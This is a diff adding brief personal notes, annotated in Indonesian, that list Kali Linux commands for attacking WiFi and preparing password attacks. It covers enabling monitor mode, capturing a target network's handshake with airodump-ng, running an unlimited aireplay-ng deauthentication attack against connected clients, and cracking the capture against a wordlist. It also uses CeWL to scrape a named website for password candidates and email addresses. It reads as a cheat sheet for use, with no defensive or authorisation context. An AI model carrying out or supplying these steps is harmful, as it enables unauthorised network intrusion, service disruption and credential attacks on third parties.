@@ -1,0 +1,61 @@
+Aircrack Wifi
+1.iwconfig
+2.cat /etc/os-release   #untuk melihat isi versi linux
+3. uname -a  #melihat detail versi kali linux
+4. airmon-ng check kill 
+5.sudo airmon-ng start wlan0
+6.sudo airmon-ng
+7.iwconfig
+8.sudo airodump-ng wlan0mon 
+9.apt install aircrack-ng @buat install aircrack
+10.airmon-ng start wlan0
+11.airodump-ng wlan0mon
+12.airodump-ng --help
+13.airodump-ng -d #macbssidtarget -c#channeltarget  -w  #namaworkstation wlan0mon
+14.aireplay-ng --help
+15.aireplay-ng --deauth 0 -#macaddreesbssid -c #macadressSatation wlan0mon
+16.aircrack-ng Test-01.cap -w  /root/wordlist.txt
+
+
+
+
+
+
+#Cewl Kali Linux Password Attack
+
+- man cewl
+- ping www.ulahex.com
+- clear
+- cewl www.ulahex.com
+- cewl -c ulahex.com
+- cewl -e --email_file mail.txt  www.ulahex.com
+- cewl -c www.ulahex.co
+
+#Kali Linux airmon-ng
+- iwconfig
+- ifconfig wlan0 down
+- airmon-ng check kill
+- airmon-ng start wlan0
+- iwconfig
+
+#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
